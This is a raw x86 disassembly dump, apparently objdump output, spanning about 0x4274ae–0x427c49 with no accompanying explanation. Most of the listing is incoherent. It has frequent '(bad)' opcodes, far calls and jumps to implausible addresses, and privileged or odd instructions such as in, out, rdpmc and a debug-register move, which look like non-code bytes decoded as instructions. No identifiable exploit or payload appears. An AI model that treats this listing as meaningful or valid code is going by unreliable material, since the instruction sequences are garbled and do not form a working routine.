  4274ae:	inc    ebp
  4274af:	lea    ecx,[ebx-0x3c370301]
  4274b5:	dec    ebp
  4274b6:	cwde   
  4274b7:	mov    esi,DWORD PTR [edx]
  4274b9:	or     BYTE PTR [ebx],al
  4274bb:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274c2:	call   0x429e0c
  4274c7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274cd:	jge    0x427502
  4274cf:	mov    eax,DWORD PTR [ebx]
  4274d1:	cld    
  4274d2:	lea    edx,[eax+0xff0120]
  4274d8:	call   0x429e6c
  4274dd:	push   eax
  4274de:	inc    DWORD PTR [ebp-0x1c]
  4274e1:	mov    ecx,DWORD PTR [ebp-0x58]
  4274e4:	xor    eax,DWORD PTR [eax]
  4274e6:	add    edi,edi
  4274e8:	cmp    ebp,eax
  4274ea:	jne    0x427512
  4274ec:	mov    DWORD PTR [eax],0x8b004dd8
  4274f2:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4274f9:	mov    eax,ebx
  4274fb:	cld    
  4274fc:	test   BYTE PTR [eax+0x320198],bh
  427502:	mov    DWORD PTR [ebp+0x8],esi
  427505:	xor    eax,DWORD PTR [ebp-0x73]
  427508:	test   DWORD PTR [esp+esi*2-0x1],edi
  42750c:	mov    ebp,eax
  42750e:	mov    eax,0x33004d29
  427513:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427519:	add    DWORD PTR [eax],eax
  42751b:	add    BYTE PTR [ebp+0x30],al
  42751e:	mov    edx,DWORD PTR [edi-0x48]
  427521:	add    ebx,0xffffffe4
  427524:	push   0x2b74cd85
  427529:	mov    eax,DWORD PTR [ebx]
  42752b:	cld    
  42752c:	sar    BYTE PTR [eax+0x3b0145],1
  427532:	pcmpeqw mm4,mm6
  427535:	xor    edi,edi
  427537:	lea    ecx,[ebx-0x239c7470]
  42753d:	add    BYTE PTR [ebp+0x50],cl
  427540:	cmp    eax,DWORD PTR [ebp+0x75]
  427543:	mov    ebp,DWORD PTR [eax-0x68]
  427546:	test   DWORD PTR [eax],eax
  427548:	clc    
  427549:	push   DWORD PTR [ebp-0x1]
  42754c:	lea    ecx,[eax]
  42754e:	int3   
  42754f:	inc    ebp
  427550:	call   0xfaa5e0
  427555:	jne    0x42754f
  427557:	xor    edi,DWORD PTR [ebp-0x41]
  42755a:	jmp    0x4275ce
  42755c:	mov    eax,DWORD PTR [eax]
  42755e:	mov    eax,0x339545c7
  427563:	inc    DWORD PTR [ebx]
  427565:	push   DWORD PTR [ecx]
  427567:	aaa    
  427568:	mov    eax,DWORD PTR [eax]
  42756a:	jmp    0x4275bc
  42756c:	mov    eax,DWORD PTR [ebp-0x3c]
  42756f:	mov    eax,eax
  427571:	cld    
  427572:	clc    
  427573:	ret    
  427574:	test   bh,al
  427576:	pop    es
  427577:	xchg   ebp,eax
  427578:	add    bh,bh
  42757a:	inc    ebp
  42757b:	dec    DWORD PTR [edi]
  42757d:	and    DWORD PTR [ebx],ebp
  42757f:	add    BYTE PTR [eax],al
  427581:	push   eax
  427582:	jbe    0x4275d9
  427584:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42758a:	or     al,0xcf
  42758c:	inc    eax
  42758d:	enter  0x745,0x72
  427591:	inc    ebp
  427592:	mov    eax,DWORD PTR [ecx]
  427594:	int3   
  427595:	add    BYTE PTR [ebp-0x75],al
  427598:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42759e:	ror    BYTE PTR [ebp+0x72f80885],1
  4275a4:	inc    ebp
  4275a5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275ab:	fadd   st,st(6)
  4275ad:	rol    BYTE PTR [ebp+0x12],0x8b
  4275b1:	inc    ebp
  4275b2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275b8:	inc    ebp
  4275b9:	test   bh,al
  4275bb:	cwde   
  4275bc:	clc    
  4275bd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275c3:	inc    ebp
  4275c4:	cmp    dh,BYTE PTR [ebx]
  4275c6:	pushf  
  4275c7:	mov    ecx,0xffb48dc7
  4275cc:	test   eax,ecx
  4275ce:	clc    
  4275cf:	dec    ebp
  4275d0:	inc    ebp
  4275d1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275d4:	pushf  
  4275d5:	rol    edi,0x86
  4275d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275d9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275df:	inc    ebp
  4275e0:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  4275e8:	test   DWORD PTR [eax],edi
  4275ea:	clc    
  4275eb:	pushf  
  4275ec:	inc    ebp
  4275ed:	dec    DWORD PTR [ebx-0x3cba0f04]
  4275f3:	push   eax
  4275f4:	(bad)  
  4275f5:	cld    
  4275f6:	jge    0x4275f8
  4275f8:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4275fe:	add    BYTE PTR [ebx],dl
  427600:	jmp    0xcd7752
  427605:	les    eax,FWORD PTR [ebp-0x35]
  427608:	mov    ecx,esi
  42760a:	lock or al,cl
  42760d:	clc    
  42760e:	inc    ebp
  42760f:	add    esi,DWORD PTR [ebx]
  427611:	jge    0x427616
  427613:	xor    edi,DWORD PTR [ebx]
  427615:	cmp    ecx,DWORD PTR [edi]
  427617:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42761c:	mov    edi,DWORD PTR [ecx]
  42761e:	test   al,0xcc
  427620:	dec    ebp
  427621:	test   BYTE PTR [ebx],dh
  427623:	pop    es
  427624:	xor    eax,DWORD PTR [eax]
  427626:	add    ecx,DWORD PTR [esi]
  427628:	add    ecx,eax
  42762a:	psraw  mm0,mm1
  42762d:	sub    BYTE PTR [ebp+0x38],cl
  427630:	mov    edi,DWORD PTR [ebx]
  427632:	lock int3 
  427634:	shl    edx,1
  427636:	rol    BYTE PTR [ebp+0xc],1
  427639:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427640:	jmp    0x7b768a
  427645:	pushf  
  427646:	inc    ebp
  427647:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42764d:	xor    ecx,ebx
  42764f:	add    ecx,esi
  427651:	mov    esi,eax
  427653:	enter  0x45af,0x8b
  427657:	xor    ecx,eax
  427659:	add    edx,DWORD PTR [ebp-0x77]
  42765c:	sub    ecx,DWORD PTR [eax]
  42765e:	cmp    eax,DWORD PTR [ebp+0x77]
  427661:	fmul   DWORD PTR [ebx-0x76385764]
  427667:	test   al,0x0
  427669:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42766f:	cmp    esi,DWORD PTR [ebx]
  427671:	pushf  
  427672:	xor    eax,edi
  427674:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42767b:	inc    ebp
  42767c:	dec    ebp
  42767d:	cmp    eax,0xc7f09c8b
  427682:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427689:	inc    ebp
  42768a:	jmp    0x4276cb
  42768c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427693:	dec    ebp
  427694:	xor    esi,DWORD PTR [ebx]
  427696:	add    eax,DWORD PTR [ebx]
  427698:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42769e:	dec    ebp
  42769f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276a5:	out    dx,eax
  4276a6:	rol    BYTE PTR [eax],1
  4276a8:	add    eax,0xebc8458b
  4276ad:	dec    ebp
  4276ae:	mov    ebp,DWORD PTR [ebx]
  4276b0:	mov    esp,0x33f84d8b
  4276b5:	ret    
  4276b6:	xor    eax,esi
  4276b8:	add    ecx,eax
  4276ba:	add    eax,DWORD PTR [edx+0xc1010f]
  4276c0:	dec    ebp
  4276c1:	inc    ebp
  4276c2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276c8:	ror    bl,1
  4276ca:	add    eax,0xebc645ce
  4276cf:	scas   eax,DWORD PTR es:[edi]
  4276d0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276d6:	xor    ebp,DWORD PTR [ebx]
  4276d8:	xor    edi,DWORD PTR [ebx]
  4276da:	add    esi,DWORD PTR [edi+0x3]
  4276dd:	mov    ecx,DWORD PTR [edi]
  4276df:	clc    
  4276e0:	rol    ebx,0x4d
  4276e3:	(bad)  
  4276e4:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4276eb:	mov    ah,0x45
  4276ed:	dec    ebp
  4276ee:	jbe    0x427723
  4276f0:	mov    esi,DWORD PTR [ebx]
  4276f2:	call   0x3345c3fa
  4276f7:	rdpmc  
  4276f9:	rol    DWORD PTR [ebx],0x4d
  4276fc:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427702:	inc    ebp
  427703:	ror    BYTE PTR [ebx+0x45450808],1
  427709:	jmp    0x10a7799
  42770e:	inc    ebp
  42770f:	inc    ebp
  427710:	(bad)  
  427711:	mov    ebx,eax
  427713:	clc    
  427714:	test   ebx,eax
  427716:	clc    
  427717:	retf   
  427718:	inc    ebp
  427719:	into   
  42771a:	mov    esi,0x8b85afec
  427720:	clc    
  427721:	enter  0x5545,0x3a
  427725:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42772c:	ret    
  42772d:	mov    ah,0xc6
  42772f:	addr16 push 0x338b4545
  427735:	clc    
  427736:	add    eax,ebx
  427738:	loopne 0x427705
  42773a:	dec    ebp
  42773b:	into   
  42773c:	mov    al,dh
  42773e:	or     BYTE PTR [edi-0x37ff748e],ch
  427744:	inc    ebp
  427745:	push   ebp
  427746:	mov    ebp,DWORD PTR [ebx]
  427748:	in     al,dx
  427749:	cmp    eax,ebx
  42774b:	ja     0x427792
  42774d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427753:	inc    ebp
  427754:	cwde   
  427755:	mov    esi,DWORD PTR [edx]
  427757:	clc    
  427758:	mov    bl,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	retf   
  42775c:	inc    ebp
  42775d:	into   
  42775e:	mov    eax,esi
  427760:	in     al,dx
  427761:	scas   eax,DWORD PTR es:[edi]
  427762:	retf   
  427763:	mov    ecx,DWORD PTR [ebp-0x38]
  427766:	mov    edx,DWORD PTR [ebp-0x24]
  427769:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427770:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427777:	mov    eax,DWORD PTR [ebx]
  427779:	clc    
  42777a:	loopne 0x42773f
  42777c:	push   ebp
  42777d:	retf   
  42777e:	mov    dh,al
  427780:	adc    esi,ecx
  427782:	jb     0x427733
  427784:	add    BYTE PTR [ebx+0x558bc845],cl
  42778a:	in     al,dx
  42778b:	sub    eax,ebx
  42778d:	cmp    ecx,ebx
  42778f:	mov    eax,esi
  427791:	mov    esp,0x45af03ce
  427796:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42779c:	mov    eax,ebx
  42779e:	in     al,dx
  42779f:	into   
  4277a0:	dec    ebp
  4277a1:	(bad)  
  4277a2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277a8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277ac:	xor    esp,esp
  4277ae:	sub    eax,DWORD PTR [ebp-0x75]
  4277b1:	add    ebp,esp
  4277b3:	mov    al,0x55
  4277b5:	inc    ebp
  4277b6:	xor    edi,DWORD PTR [eax]
  4277b8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277bf:	inc    ebp
  4277c0:	xor    edi,DWORD PTR [ecx]
  4277c2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277c9:	test   DWORD PTR [eax],eax
  4277cb:	clc    
  4277cc:	enter  0x8645,0x33
  4277d0:	inc    DWORD PTR [ebx]
  4277d2:	(bad)  
  4277d3:	jmp    0x42781a
  4277d5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277db:	inc    ebp
  4277dc:	(bad)  
  4277dd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4277e3:	cwde   
  4277e4:	retf   
  4277e5:	xor    al,cl
  4277e7:	mov    BYTE PTR [ebp+0xb],cl
  4277ea:	lea    eax,[ebp+0x8]
  4277ed:	xor    esi,DWORD PTR [edx+0x3]
  4277f0:	add    al,ah
  4277f2:	inc    ebp
  4277f3:	dec    ebp
  4277f4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4277fa:	push   0x2b45cd00
  4277ff:	mov    al,BYTE PTR [ebx]
  427801:	or     esi,eax
  427803:	dec    ebp
  427804:	inc    ebp
  427805:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42780b:	push   ebp
  42780c:	(bad)  
  42780d:	mov    BYTE PTR [edi+0xf723b11],ch
  427813:	add    ch,ch
  427815:	inc    ebp
  427816:	dec    DWORD PTR [ebx-0x34332775]
  42781c:	add    al,0x4d
  42781e:	inc    ebp
  42781f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427825:	cwde   
  427826:	add    DWORD PTR [edx],esi
  427828:	add    BYTE PTR [ebx+0x4d00c000],cl
  42782e:	push   DWORD PTR [ebx]
  427830:	int3   
  427831:	xor    eax,DWORD PTR [eax]
  427833:	add    edx,DWORD PTR [eax+0x3]
  427836:	mov    DWORD PTR [edi],ecx
  427838:	call   0x428838fe
  42783d:	mov    DWORD PTR [ebp-0x20],esp
  427840:	add    BYTE PTR [ebp+0x7d],al
  427843:	mov    eax,DWORD PTR [eax]
  427845:	in     al,0x15
  427847:	ret    
  427848:	iret   
  427849:	(bad)  
  42784a:	enter  0x14af,0x8b
  42784e:	(bad)  
  42784f:	in     al,dx
  427850:	or     bl,cl
  427852:	adc    cl,al
  427854:	push   ebp
  427855:	dec    ebp
  427856:	inc    eax
  427857:	mov    edx,DWORD PTR [ebp-0x20]
  42785a:	jb     0x427827
  42785c:	mov    ecx,esi
  42785e:	cld    
  42785f:	scas   eax,DWORD PTR es:[edi]
  427860:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427867:	mov    BYTE PTR [eax],0x8c
  42786a:	push   0xffffff98
  42786c:	push   edi
  42786d:	xor    dl,BYTE PTR [eax+0x3b]
  427870:	mov    ecx,DWORD PTR [edi]
  427872:	call   0x8c41bdd5
  427877:	mov    eax,eax
  427879:	in     al,dx
  42787a:	jge    0x4278c9
  42787c:	mov    DWORD PTR [ebx],esi
  42787e:	int3   
  42787f:	add    eax,DWORD PTR [ebp+0xf]
  427882:	xor    eax,ecx
  427884:	(bad)  
  427885:	dec    ebp
  427886:	pushf  
  427887:	xor    ecx,eax
  427889:	add    edi,DWORD PTR [edi]
  42788b:	mov    eax,DWORD PTR [ebp-0x38]
  42788e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427895:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42789b:	xor    edx,DWORD PTR [ecx+edi*4]
  42789e:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278a5:	dec    ebp
  4278a6:	leave  
  4278a7:	mov    edx,ecx
  4278a9:	rol    BYTE PTR [ebp+0x330155],1
  4278af:	add    ecx,DWORD PTR [ebp+0xf]
  4278b2:	xor    eax,edx
  4278b4:	(bad)  
  4278b5:	ror    DWORD PTR [eax],0x86
  4278b8:	jb     0x4278b7
  4278ba:	add    bh,bh
  4278bc:	clc    
  4278bd:	inc    ebp
  4278be:	jb     0x42792a
  4278c0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278c6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278cc:	shr    BYTE PTR [eax-0x3d],0x30
  4278d0:	clc    
  4278d1:	add    BYTE PTR [ebp+0x75],al
  4278d4:	cmp    BYTE PTR [edx-0x64],ch
  4278d7:	inc    edi
  4278d9:	adc    al,0xe8
  4278db:	inc    ebp
  4278dc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4278e2:	mov    ecx,DWORD PTR [eax]
  4278e4:	cld    
  4278e5:	or     DWORD PTR [ebp-0x34],0x33
  4278e9:	jbe    0x4278ee
  4278eb:	mov    edx,DWORD PTR [ecx+0x2b]
  4278ee:	dec    ebp
  4278ef:	mov    cl,BYTE PTR [ebx+0x45d801]
  4278f5:	mov    BYTE PTR [ebx],dh
  4278f7:	mov    eax,DWORD PTR [ebx]
  4278f9:	or     BYTE PTR [ecx+0x3b],dl
  4278fc:	dec    ebp
  4278fd:	int3   
  4278fe:	xor    ebp,edi
  427900:	add    eax,DWORD PTR [ebp+0x51]
  427903:	mov    ecx,DWORD PTR [ebp-0x28]
  427906:	xor    eax,DWORD PTR [eax]
  427908:	add    ebp,DWORD PTR [eax+0x51]
  42790b:	adc    BYTE PTR [eax+0x0],0x8b
  42790f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427915:	inc    ebp
  427916:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42791c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427922:	dec    ebp
  427923:	mov    esi,DWORD PTR [ebx]
  427925:	hlt    
  427926:	add    eax,ebx
  427928:	push   ecx
  427929:	inc    ebp
  42792a:	dec    ebp
  42792b:	sar    bh,1
  42792d:	shl    ah,1
  42792f:	(bad)  
  427930:	retf   
  427931:	mov    al,ds:0xc5ff3dce
  427936:	adc    al,0xc6
  427938:	inc    ebp
  427939:	and    eax,0x9c0f4c85
  42793e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427945:	cmp    BYTE PTR [ebx+0x3b],0x0
  427949:	mov    dh,0xc7
  42794b:	cmp    eax,eax
  42794d:	jne    0x45437199
  427953:	mov    edi,DWORD PTR [edx]
  427955:	mov    eax,0x848bcb9c
  42795a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427961:	or     BYTE PTR [edi],cl
  427963:	(bad)  
  427964:	dec    ebp
  427965:	inc    edi
  427966:	add    bh,0x50
  427969:	or     cl,ch
  42796b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427971:	xchg   DWORD PTR [eax-0x1638af64],eax
  427977:	mov    esp,0xf802b588
  42797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42797d:	inc    ebp
  42797e:	(bad)  
  42797f:	cmp    al,0xff
  427981:	pushf  
  427982:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427989:	mov    ecx,DWORD PTR [ebp-0x340018]
  42798f:	into   
  427990:	dec    DWORD PTR [ebx-0x7f72431c]
  427996:	push   0x5000ff01
  42799b:	retf   
  42799c:	inc    ebp
  42799d:	into   
  42799e:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279a4:	push   eax
  4279a5:	into   
  4279a6:	call   0x4a7e36
  4279ab:	retf   
  4279ac:	add    dh,cl
  4279ae:	add    bh,bh
  4279b0:	mov    DWORD PTR [eax+ecx*1],edx
  4279b3:	clc    
  4279b4:	inc    ebp
  4279b5:	inc    ebp
  4279b6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279bc:	push   0x1
  4279be:	push   edi
  4279bf:	add    BYTE PTR [eax-0x35],dl
  4279c2:	mov    ecx,esi
  4279c4:	cld    
  4279c5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279cb:	into   
  4279cc:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279d3:	xor    eax,DWORD PTR [ebp+0x3]
  4279d6:	jne    0x427a29
  4279d8:	call   DWORD PTR [eax-0x3c]
  4279db:	mov    DWORD PTR [ecx-0x18],edx
  4279de:	mov    edi,edi
  4279e0:	call   0x8b45bf69
  4279e5:	add    ah,ah
  4279e7:	rol    BYTE PTR [ebp-0x7c],0xeb
  4279eb:	add    edi,edi
  4279ed:	add    al,ch
  4279ef:	inc    ebp
  4279f0:	push   ecx
  4279f1:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  4279f7:	mov    al,0xc7
  4279f9:	test   esp,esp
  4279fb:	clc    
  4279fc:	test   DWORD PTR [ebp-0x8],ecx
  4279ff:	add    BYTE PTR [ebp+0x50],0x39
  427a03:	jmp    0x8bcc02a4
  427a08:	in     al,dx
  427a09:	or     BYTE PTR [ebp-0xf],al
  427a0c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a12:	hlt    
  427a13:	mov    eax,DWORD PTR [ebp-0x50]
  427a16:	xor    esi,ecx
  427a18:	add    eax,DWORD PTR [eax+0x4f086889]
  427a1e:	inc    ebp
  427a1f:	sbb    eax,0x68
  427a22:	pushf  
  427a23:	inc    edi
  427a25:	add    al,ch
  427a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a28:	test   edi,edi
  427a2a:	clc    
  427a2b:	inc    DWORD PTR [ebp-0x73]
  427a2e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a32:	(bad)  
  427a33:	push   ecx
  427a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a35:	jne    0x4279bc
  427a37:	push   eax
  427a38:	clc    
  427a39:	test   DWORD PTR [ebp-0x1],eax
  427a3c:	cmp    eax,0xc78b9cff
  427a41:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a48:	inc    ebp
  427a49:	push   edi
  427a4a:	aas    
  427a4b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a52:	dec    ebp
  427a53:	add    BYTE PTR [ebx],dh
  427a55:	inc    ebp
  427a56:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a5c:	enter  0x8401,0x0
  427a60:	add    al,BYTE PTR [eax]
  427a62:	add    bh,bh
  427a64:	out    dx,eax
  427a65:	sbb    BYTE PTR [eax],al
  427a67:	dec    ebp
  427a68:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a6e:	sub    esi,DWORD PTR [ebx]
  427a70:	mov    ebp,DWORD PTR [eax-0x8]
  427a73:	add    bl,0x0
  427a76:	(bad)  
  427a77:	cmp    eax,ecx
  427a79:	or     BYTE PTR [edx+0x750114],al
  427a7f:	inc    DWORD PTR [ebp+0x18]
  427a82:	mov    eax,DWORD PTR [ebp-0x8]
  427a85:	mov    ebx,eax
  427a87:	(bad)  
  427a88:	retf   
  427a89:	inc    ebp
  427a8a:	into   
  427a8b:	mov    esi,eax
  427a8d:	int3   
  427a8e:	scas   eax,DWORD PTR es:[edi]
  427a8f:	push   es
  427a90:	mov    esi,DWORD PTR [ebp-0xc]
  427a93:	call   DWORD PTR [ebp+0x18]
  427a96:	sub    edi,DWORD PTR [ebp+0x3b]
  427a99:	mov    esi,DWORD PTR [edi-0x34]
  427a9c:	mov    eax,DWORD PTR [ebp-0x8]
  427a9f:	cmp    bl,al
  427aa1:	pushf  
  427aa2:	mov    bh,0xbc
  427aa5:	fadd   QWORD PTR [eax]
  427aa7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427aad:	mov    esi,DWORD PTR [ebx]
  427aaf:	in     al,0x33
  427ab1:	ret    
  427ab2:	add    eax,esi
  427ab4:	add    eax,DWORD PTR [ebp+0xf]
  427ab7:	mov    eax,ecx
  427ab9:	in     al,0x4d
  427abb:	ret    
  427abc:	mov    eax,esi
  427abe:	in     al,dx
  427abf:	inc    ebp
  427ac0:	rol    edi,1
  427ac2:	sar    al,1
  427ac4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aca:	add    BYTE PTR [edx],bh
  427acc:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427ad3:	test   ebx,eax
  427ad5:	clc    
  427ad6:	retf   
  427ad7:	inc    ebp
  427ad8:	into   
  427ad9:	cmp    al,0xc6
  427adb:	pushf  
  427adc:	scas   eax,DWORD PTR es:[edi]
  427add:	(bad)  
  427ade:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427ae5:	inc    ebp
  427ae6:	cmp    edi,DWORD PTR [esi]
  427ae8:	ja     0x427a86
  427aea:	mov    eax,edi
  427aec:	mov    esp,0x458567a8
  427af1:	clc    
  427af2:	mov    eax,DWORD PTR [ebp-0x8]
  427af5:	mov    eax,ebx
  427af7:	in     al,dx
  427af8:	retf   
  427af9:	ret    
  427afa:	into   
  427afb:	mov    dh,0x7d
  427afe:	scas   eax,DWORD PTR es:[edi]
  427aff:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b05:	add    BYTE PTR [ebx],ch
  427b07:	jmp    0xb97c47
  427b0c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b0f:	mov    eax,DWORD PTR [ebp-0x14]
  427b12:	inc    ebp
  427b13:	enter  0x458b,0xf8
  427b17:	xor    eax,ebx
  427b19:	add    ecx,ebx
  427b1b:	cmp    ecx,esi
  427b1d:	shufps xmm7,xmm4,0xaf
  427b21:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b27:	dec    ebp
  427b28:	sub    esi,DWORD PTR [ebx]
  427b2a:	cmp    esi,DWORD PTR [ebx]
  427b2c:	ja     0x427b31
  427b2e:	mov    eax,DWORD PTR [ebx]
  427b30:	lods   al,BYTE PTR ds:[esi]
  427b31:	mov    db0,ecx
  427b34:	inc    ebp
  427b35:	dec    ebp
  427b36:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b3c:	retf   
  427b3d:	rol    dh,1
  427b3f:	or     al,0xce
  427b41:	inc    ebp
  427b42:	scas   eax,DWORD PTR es:[edi]
  427b43:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b49:	add    BYTE PTR [ebx],ch
  427b4b:	add    BYTE PTR [ebx],bh
  427b4d:	inc    ebp
  427b4e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b54:	inc    ebp
  427b55:	retf   
  427b56:	mov    ecx,esi
  427b58:	clc    
  427b59:	(bad)  
  427b5a:	retf   
  427b5b:	scas   eax,DWORD PTR es:[edi]
  427b5c:	ret    
  427b5d:	mov    ecx,esi
  427b5f:	hlt    
  427b60:	(bad)  
  427b61:	push   ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b69:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b6f:	add    BYTE PTR [ebx],al
  427b71:	mov    eax,eax
  427b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b74:	inc    ebp
  427b75:	dec    ebp
  427b76:	cmp    BYTE PTR [ebx],dh
  427b78:	pushf  
  427b79:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b7f:	(bad)  
  427b81:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427b89:	sar    eax,1
  427b8b:	rol    BYTE PTR [ebp+0x5],1
  427b8e:	xor    eax,DWORD PTR [ebp+0x3]
  427b91:	jmp    0x427b7e
  427b93:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427b99:	xor    eax,DWORD PTR [ebp+0x33]
  427b9c:	mov    eax,DWORD PTR [ebx]
  427b9e:	rol    BYTE PTR [ebx],1
  427ba0:	test   BYTE PTR [edi],cl
  427ba2:	cwde   
  427ba3:	shl    DWORD PTR [edx],0x4d
  427ba6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bac:	xor    edx,eax
  427bae:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bb4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bba:	add    BYTE PTR [ebx],dh
  427bbc:	inc    ebp
  427bbd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427bc3:	rdpmc  
  427bc5:	rol    DWORD PTR [ebx],0x4d
  427bc8:	loopne 0x427b55
  427bca:	push   ebp
  427bcb:	in     al,dx
  427bcc:	mov    cl,dl
  427bce:	adc    eax,edx
  427bd0:	jb     0x427bd7
  427bd2:	add    BYTE PTR [ebp+0x45],al
  427bd5:	jmp    0x427b62
  427bd7:	mov    ebx,eax
  427bd9:	test   al,0xcb
  427bdb:	dec    ebp
  427bdc:	dec    ebp
  427bdd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427be3:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427be9:	dec    ebp
  427bea:	mov    al,0x8b
  427bec:	dec    ebp
  427bed:	in     al,dx
  427bee:	xor    edx,ecx
  427bf0:	xor    edx,eax
  427bf2:	add    eax,DWORD PTR [ebp+0x3]
  427bf5:	jbe    0x427c06
  427bf7:	mov    eax,ecx
  427bf9:	test   al,0x45
  427bfb:	dec    ebp
  427bfc:	mov    DWORD PTR [ebx],esi
  427bfe:	loopne 0x427c33
  427c00:	inc    ebp
  427c01:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c07:	rol    esi,0x45
  427c0a:	scas   eax,DWORD PTR es:[edi]
  427c0b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c11:	mov    eax,ecx
  427c13:	hlt    
  427c14:	dec    ebp
  427c15:	inc    ebp
  427c16:	mov    eax,edi
  427c18:	loopne 0x427bf2
  427c1a:	retf   
  427c1b:	test   esi,ecx
  427c1d:	clc    
  427c1e:	scas   eax,DWORD PTR es:[edi]
  427c1f:	inc    ebp
  427c20:	mov    eax,edi
  427c22:	fdiv   st,st(0)
  427c24:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c2a:	cwde   
  427c2b:	cmp    dh,BYTE PTR [edx]
  427c2d:	pushf  
  427c2e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c34:	inc    esi
  427c36:	mov    ebp,DWORD PTR [eax-0x10]
  427c39:	inc    ebp
  427c3a:	dec    ebp
  427c3b:	xor    esi,DWORD PTR [ebx]
  427c3d:	add    eax,DWORD PTR [ebx]
  427c3f:	loopne 0x427c50
  427c41:	dec    ebp
  427c42:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c49:	add    BYTE PTR [ebx-0x7b740bbb],cl
